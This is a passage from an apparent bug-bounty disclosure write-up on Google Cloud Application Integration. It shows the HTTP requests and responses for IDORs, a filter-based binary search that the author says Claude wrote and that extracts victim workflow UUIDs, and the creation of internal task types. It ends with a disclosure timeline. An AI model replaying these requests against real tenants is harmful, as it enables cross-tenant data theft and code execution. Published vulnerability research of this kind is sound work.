+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cloudcrmipfrontend-pa.clients6.google.com
+...
+
+<span class="language-subunit">{&quot;workflowId&quot;: &quot;f91833bf-eacb<span class="hljs-string">-43</span>ac<span class="hljs-string">-8490</span><span class="hljs-string">-099</span>fef977e19&quot;}</span></code></pre><p>Running a workflow configured with <code>GenericStubbyTypedTaskV2</code> with <code>serverSpec</code> set to <code>gslb:alkali-base</code> and service/method set to <code>/ServerStatus.GetServices</code>, we were able to <strong>execute the Stubby query</strong>:</p>
+<pre><code class="hljs language-json">...
+<span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;protoValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;type.googleapis.com/rpc.ServiceList&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;service&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AlkaliBaseAccountService&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;descriptor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+            <span class="hljs-attr">&quot;filename&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;google/internal/alkali/base/v1/alkali_base_account_service.proto&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AlkaliBaseAccountService&quot;</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+            <span class="hljs-punctuation">{</span>
+                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ListAccounts&quot;</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;argumentType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;google.internal.alkali.base.v1.ListAccountsRequest&quot;</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;resultType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;google.internal.alkali.base.v1.ListAccountsResponse&quot;</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;deadline&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;securityLevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;none&quot;</span>
+            <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-punctuation">{</span>
+                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ListAccessibleAccounts&quot;</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;argumentType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;google.internal.alkali.base.v1.ListAccessibleAccountsRequest&quot;</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;resultType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;google.internal.alkali.base.v1.ListAccountsResponse&quot;</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;deadline&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
+                <span class="hljs-attr">&quot;securityLevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;none&quot;</span>
+            <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+            ...</code></pre><p>We then updated the initial bug with the escalation to RCE. Neither of us could have done this alone, and the timing was clutch: just one hour after our PoC, the fix for <code>createDraftWorkflow</code> fully propagated. Any later and this RCE escalation would&#39;ve stayed theoretical. That being said, we were cut off by Google before we could actually execute code on Google&#39;s servers.</p>
+<h3 id="timeline-1st-rce"><a class="anchor" href="#timeline-1st-rce" aria-hidden="true">#</a>Timeline (1st RCE)</h3><ul>
+<li>2025-12-01 - Initial report sent to Google</li>
+<li>2025-12-01 - Google triaged report as P0/S0</li>
+<li>2025-12-01 - 🎉 <strong>Nice catch!</strong></li>
+<li>2026-01-12 - Informed Google&#39;s security team about the RCE escalation</li>
+<li>2026-01-12 - Updated report with RCE PoC</li>
+<li>2026-01-12 - Report escalated by Google</li>
+<li>2026-01-16 - <strong>Panel awards $60,000</strong>. Rationale for this decision: This report was of exceptional quality! Vulnerability category is &quot;Compromise of Google Cloud Production Environment&quot;. Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.</li>
+</ul>
+<h3 id="round-2-3-months-later"><a class="anchor" href="#round-2-3-months-later" aria-hidden="true">#</a>Round 2 (3 months later)</h3><p>You thought that was the end of it, not so easy. Three months later, my fuzzer pinged me about some IDORs in the public Application Integration product&#39;s <a href="https://docs.cloud.google.com/application-integration/docs/reference/rest" target="_blank" rel="noopener noreferrer">public API</a>.</p>
+<p>Turns out, throughout this whole API, you could reference your own project ID in the URL, but reference someone else&#39;s UUID:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/v1/projects/&lt;your-project&gt;/locations/us-central1/integrations/anythinghere/versions/&lt;victim-uuid&gt;</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>integrations.googleapis.com
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer &lt;redacted&gt;</code></pre><p>and the API would happily return the victim&#39;s resource, because the authentication check was done on your project ID (you are authorized for your own project), but there was no access control check if the ID was actually tied to your project or not.</p>
+<p>However, this by itself wouldn&#39;t be too impactful, because these are UUIDv4. The search space is far too large to be meaningfully bruteforce-able (search space of 10^36). Hence, I went looking around for any way I could potentially leak a victim&#39;s resource UUIDs.</p>
+<p>That&#39;s when I noticed this interesting &quot;test cases&quot; feature. From the <a href="https://docs.cloud.google.com/application-integration/docs/test-cases" target="_blank" rel="noopener noreferrer">documentation</a>:</p>
+<blockquote>
+<p>With Application Integration, you can create and run multiple test cases on your complex integrations that connect and manage Google Cloud services and other business applications. By testing your integration flow, you can ensure that your integration is working as intended.</p>
+</blockquote>
+<p>The interesting thing was, when you look at how your test cases are loaded in the frontend, the browser sends a request like so:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>us-central1-integrations.clients6.google.com
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-protobuf
+
+<span class="language-apache"><span class="hljs-section">&lt; RAW PROTOBUF DATA &gt;</span></span></code></pre><p>The actual request payload is in protobuf, I&#39;ve decoded here so you can see how it looks like:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;2&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;6&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;display_name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;update_time&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;client_id&quot;</span><span class="hljs-punctuation">]</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre><p>Field <code>1</code> is the parent resource (my project, my version UUID), field <code>6</code> is the response field mask, and field <code>2</code>, <code>workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4</code> seemed to be some sort of filter. Perhaps if this was omitted, it would return test cases for all workflows? Surely not...</p>
+<p>Dropping field <code>2</code> and <code>6</code> from the request:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4&quot;</span>
+<span class="hljs-punctuation">}</span></code></pre><p>...the response came back with test cases from every other GCP project:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;testCases&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;displayName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;triggerId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api_trigger/AI_bebbia_CreateWOSubs_API_1&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;testInputParameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-punctuation">{</span>
+          <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;InputData&quot;</span><span class="hljs-punctuation">,</span>
+          <span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JSON_VALUE&quot;</span><span class="hljs-punctuation">,</span>
+          <span class="hljs-attr">&quot;defaultValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+            <span class="hljs-attr">&quot;jsonValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;{\n  \&quot;OldSKU\&quot;: \&quot;300465\&quot;,\n  \&quot;orderid\&quot;: \&quot;7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\&quot;,\n  ...\n}&quot;</span>
+          <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+          <span class="hljs-attr">&quot;displayName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;InputData&quot;</span>
+        <span class="hljs-punctuation">}</span>
+      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;creatorEmail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;redacted@google.com&quot;</span><span class="hljs-punctuation">,</span>
+      ...
+    <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">}</span></code></pre><p>Looking closer at the response though, you may notice something off. The <code>versions/...</code> segment in every result is <code>631a0566-02fc-4dce-b319-25e2c68168f4</code>. That&#39;s <em>my</em> version UUID, the one I sent in field <code>1</code>. The API was just reflecting it straight back into every test case&#39;s <code>name</code>, even though these test cases belong to completely different integrations in different projects.</p>
+<p>So while I now had every test case ID across every GCP project, along with their integration names and creator emails, the actual victim version UUIDs which I needed to feed into those IDORs from earlier were nowhere in the response.</p>
+<p>That said, the test case IDs alone were already good for some real impact. Application Integration exposes an <code>:executeTest</code> endpoint that runs a test case by its ID, and it didn&#39;t actually need the victim&#39;s real version UUID.</p>
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/projects/&lt;your-project&gt;/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>integrations.googleapis.com
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer &lt;redacted&gt;
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0</code></pre><p><strong>Response</strong></p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;executionId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5d49abed-7692-47aa-8660-5cdaea92d2af&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;outputParameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;output&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>
+  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;assertionResults&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;assertion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;assertionStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ASSERT_EQUALS&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+          <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;output&quot;</span><span class="hljs-punctuation">,</span>
+          <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;intValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3&quot;</span> <span class="hljs-punctuation">}</span>
+        <span class="hljs-punctuation">}</span>
+      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;taskNumber&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;taskName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JsonnetMapperTask&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SUCCEEDED&quot;</span>
+    <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;testExecutionState&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;PASSED&quot;</span>
+<span class="hljs-punctuation">}</span></code></pre><p>So I could already trigger arbitrary test cases to execute in any victim&#39;s environment, but the real goal was still to access a victim&#39;s entire integration through the IDORs from earlier, and for that I needed the actual version UUID.</p>
+<p>I was stuck here for a bit. That was, until I had an idea. The <code>filter</code> parameter (field <code>2</code>) clearly supports comparison operators like <code>=</code>. What if it also supports <code>&gt;</code> and <code>&lt;=</code>? If it does, I could anchor on a known test case ID and then binary search the <code>workflow_id</code> field, one hex character at a time, until I&#39;d reconstructed the entire UUID:</p>
+<pre><code>id = &quot;&lt;known-tc-uuid&gt;&quot; AND workflow_id &gt; &quot;&lt;low&gt;&quot; AND workflow_id &lt;= &quot;&lt;high&gt;&quot;</code></pre><p>Each request narrows the range. If the test case still appears in the response, the real <code>workflow_id</code> is in <code>(low, high]</code>, otherwise it&#39;s outside. A 32-character hex UUID should in theory fall out in around 128 requests.</p>
+<p>I had Claude write a PoC for this, and it worked perfectly first try:</p>
+<pre><code>$ python extract_by_id.py --token &quot;&lt;redacted&gt;&quot; --project 273897706296 --location &quot;us-central1&quot; --tc-id &quot;60413427-4d07-4c36-bce0-66cfcdd81879&quot;
+Test case: 60413427-4d07-4c36-bce0-66cfcdd81879
+Parent:    projects/273897706296/locations/us-central1/integrations/x/versions/-
+
+Verified: target found. Starting binary search...
+
+  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)
+  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)
+  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)
+  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)
+  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)
+  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)
+  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)
+  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)
+
+workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56
+Total requests: 128</code></pre><p>I now had the victim&#39;s actual integration version UUID. Chaining this with the <code>GetIntegrationVersion</code> IDOR:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/v1/projects/&lt;your-project&gt;/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>integrations.googleapis.com
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer &lt;redacted&gt;</code></pre><p>It returned the full integration belonging to a different project, including every trigger config, task config, parameter binding, and creator email:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;projects/&lt;your-project&gt;/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;DRAFT&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;triggerConfigs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;API Trigger&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;triggerType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;API&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;triggerId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api_trigger/TestCasePOC5_API_1&quot;</span>
+    <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;taskConfigs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+      <span class="hljs-attr">&quot;task&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;GenericRestV2Task&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;displayName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Call REST Endpoint&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;url&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;stringValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$url$&quot;</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;httpMethod&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;httpMethod&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;stringValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;authConfigName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;authConfigName&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;stringValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;authprofiletest&quot;</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
+      <span class="hljs-punctuation">}</span>
+    <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+  ...
+  <span class="hljs-attr">&quot;integrationParameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;url&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;dataType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;STRING_VALUE&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;defaultValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;stringValue&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://example.com&quot;</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;lastModifierEmail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gvrptest4@gmail.com&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;createTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2026-03-22T11:10:30.087Z&quot;</span>
+<span class="hljs-punctuation">}</span></code></pre><p>If you remember from the original test cases dump, a fair number of those <code>creatorEmail</code> fields ended in <code>@google.com</code>. So there are plenty of internal Google teams running their own integrations on this platform. My obvious next thought was what if some of these Googler integrations already have <code>GenericStubbyTypedTaskV2</code> (or other internal-only tasks like <code>PythonTask</code>, <code>CreateBuganizerIssueTask</code>, etc.) configured? Any one of those would extend this cross-tenant chain into something significantly worse.</p>
+<p>I couldn&#39;t actually check though. Doing so would mean iterating over real customer data which would break the Google VRP rules, so I bundled up everything I had and sent the report off to Cloud VRP.</p>
+<h3 id="configuring-internal-task-types"><a class="anchor" href="#configuring-internal-task-types" aria-hidden="true">#</a>Configuring internal task types</h3><p>This made me think though, what exactly was stopping me from creating my own integration with an internal task type?</p>
+<p>If I tried to create an internal task:</p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>integrations.googleapis.com
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer &lt;redacted&gt;
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1033
+
+<span class="language-prolog">{
+  <span class="hljs-string">&quot;taskConfigsInternal&quot;</span>: [
+    {
+      <span class="hljs-string">&quot;taskNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,
+      <span class="hljs-string">&quot;taskName&quot;</span>: <span class="hljs-string">&quot;PythonTask&quot;</span>,
+      ...
+      <span class="hljs-string">&quot;taskEntity&quot;</span>: {
+        <span class="hljs-string">&quot;uiConfig&quot;</span>: {
+          <span class="hljs-string">&quot;taskUiModuleConfigs&quot;</span>: [
+            {
+              <span class="hljs-string">&quot;moduleId&quot;</span>: <span class="hljs-string">&quot;RPC_TYPED&quot;</span>
+            }
+          ]
+        }
+      },
+      <span class="hljs-string">&quot;taskType&quot;</span>: <span class="hljs-string">&quot;ASIS_TEMPLATE&quot;</span>,
+      <span class="hljs-string">&quot;parameters&quot;</span>: {
+        <span class="hljs-string">&quot;TEST&quot;</span>: {
+          <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,
+          <span class="hljs-string">&quot;value&quot;</span>: {
+            <span class="hljs-string">&quot;stringValue&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>
+          }
+        }
+      }
+    }
+  ],
+  ...
+}</span></code></pre><p>It would actually work:</p>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=UTF-8
+
+<span class="language-perl">{
+  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a&quot;</span>,
+  <span class="hljs-string">&quot;origin&quot;</span>: <span class="hljs-string">&quot;UI&quot;</span>,
+  <span class="hljs-string">&quot;snapshotNumber&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,
+  <span class="hljs-string">&quot;updateTime&quot;</span>: <span class="hljs-string">&quot;2026-05-01T07:30:07.182512Z&quot;</span>,
+  <span class="hljs-string">&quot;lockHolder&quot;</span>: <span class="hljs-string">&quot;gvrptest4<span class="hljs-variable">@gmail</span>.com&quot;</span>,
+  <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2026-05-01T07:30:07.182512Z&quot;</span>,
+  <span class="hljs-string">&quot;lastModifierEmail&quot;</span>: <span class="hljs-string">&quot;gvrptest4<span class="hljs-variable">@gmail</span>.com&quot;</span>,
+  <span class="hljs-string">&quot;state&quot;</span>: <span class="hljs-string">&quot;DRAFT&quot;</span>,
+  ...
+}</span></code></pre><p>But when I tried to actually execute the workflow, it would just time out with the following error:</p>
+<pre><code> Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution and 10min for async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please try to break down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: &#39;common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT&#39;&#39; </code></pre><p>However, I noticed something peculiar. When I configured the <code>PythonTask</code> (one of the internal tasks), created a test case and executed the test case, instead of timing out, I got this suspicious error on the frontend:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;2&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.IOException: No space left on device&quot;</span>
+<span class="hljs-punctuation">}</span></code></pre><p>That&#39;s a real exception from the execution backend, not a timeout. Whatever code path the test case feature was running on, it was happily reaching deep enough to fail on actual disk I/O. Trying the same trick with <code>GenericStubbyTypedTaskV2</code> got me a less informative but equally suspicious response:</p>
+<pre><code>Failed to execute test case. Error: Unknown Error.</code></pre><p>I checked the workflow execution logs, and that&#39;s when the actual error showed up:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">500</span> <span class="hljs-punctuation">}</span></code></pre><p>This is extremely suspicious. I was definitely onto something. By hitting:</p>
+<pre><code class="hljs language-http">GET /v1/projects/&lt;project&gt;/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>integrations.googleapis.com</code></pre><p>It was possible to pull the entire stack trace:</p>
